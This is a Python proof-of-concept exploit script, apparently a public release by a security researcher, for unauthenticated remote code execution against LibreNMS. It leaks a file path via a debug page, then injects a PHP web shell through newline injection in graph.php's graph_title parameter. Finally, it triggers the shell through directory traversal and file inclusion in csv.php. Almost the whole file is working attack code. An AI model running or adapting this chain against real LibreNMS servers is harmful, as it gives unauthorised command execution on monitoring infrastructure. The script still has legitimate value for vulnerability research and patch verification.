#!/usr/bin/env python3
# Pre-auth remote code execution against LibreNMS
# By Eldar "Wireghoul" Marcussen - www.justanotherhacker.com
# It's over complicated to showcase some of the fun bug chains
#
# Seize the means of network monitoring!
######################################
#   _
#  //\
#  V  \
#   \  \_
#    \,'.`-.
#     |\ `. `.       
#     ( \  `. `-.                        _,.-:\
#      \ \   `.  `-._             __..--' ,-';/
#       \ `.   `-.   `-..___..---'   _.--' ,'/
#        `. `.    `-._        __..--'    ,' /
#          `. `-_     ``--..''       _.-' ,'
#            `-_ `-.___        __,--'   ,'
#               `-.__  `----""""  __.-'
#                  `--..____..--'
#
# LIBERATE! BANANAS! LIBERATE! MY NANAS!
#  - Slipknot Liberate - https://youtu.be/GHR8IkJIbZY?t=61


import requests
import sys
import re

# Banner
print("\nLibreNMS unauthenticated remote code execution PoC by @Wireghoul")
print("======================================[ justanotherhacker.com]==\n")


if len(sys.argv) == 1 :
    print("Usage: ", sys.argv[0], " http://url/librenms")
    exit(2)

print("[*] Checking url for a vulnerable LibreNMS install, relax and eat a BANANA!")
r = requests.get(sys.argv[1]+'/pages/about.inc.php')
if r.status_code == 404 :
    print("[!] Page not found:", sys.argv[1]+"/pages/about.inc.php. terminating...")
    exit(2)

if not r.text.find("git log") :
    print("[!] LibreNMS installation does not appear to be vulnerable, foiled ... again!")
    exit(2)

print("[*] Installation appears vulnerable, attempting to leak local file path")
r = requests.get(sys.argv[1]+"/legacy_index.php?debug=1")
regx = re.compile('b>(.*)legacy_index.php</b> on line')
lfp = regx.search(r.text).group(1)
if not lfp :
    print("[-] Unable to leak local file path, defaulting to '/tmp'")
    lfp = '/tmp'
else:
    print("[+] Local file path found:", lfp)
    lfp = lfp+"../storage/framework/cache/data"

print("[*] Combining auth bypass, header injection and arbitrary file write to write payload to server file system!")
print("[*] Repeating action 3 times, to ensure it triggers...")
print("[*] .1")
r = requests.get(sys.argv[1]+"/graph.php?device=1&type=device_ber&from=0&to=0&width=10&height=10&graph_title=pwnt'%0a%0agraph+"+lfp+"/pwn.csv.inc.php+-t+t+LINE:1:\"<?=`$_GET[c]`?>\"+-a+CSV%0a")
print("[*] ..2")
r = requests.get(sys.argv[1]+"/graph.php?device=1&type=device_ber&from=0&to=0&width=10&height=10&graph_title=pwnt'%0a%0agraph+"+lfp+"/pwn.csv.inc.php+-t+t+LINE:1:\"<?=`$_GET[c]`?>\"+-a+CSV%0a")
print("[*] ...3")
r = requests.get(sys.argv[1]+"/graph.php?device=1&type=device_ber&from=0&to=0&width=10&height=10&graph_title=pwnt'%0a%0agraph+"+lfp+"/pwn.csv.inc.php+-t+t+LINE:1:\"<?=`$_GET[c]`?>\"+-a+CSV%0a")
print("[*] Combining more bugs, auth bypass, directory traversal and local file include for code execution...")
r = requests.get(sys.argv[1]+"/csv.php?report=../../../../../../../../../"+lfp+"/pwn&c=id")
if r.status_code == 200 :
    print("[+] Exploit success! (output of",sys.argv[1]+"/csv.php?report=../../../../../../../../../"+lfp+"/pwn&c=id below):")
else:
    print("[!] Exploit failed:")
print(r.text)
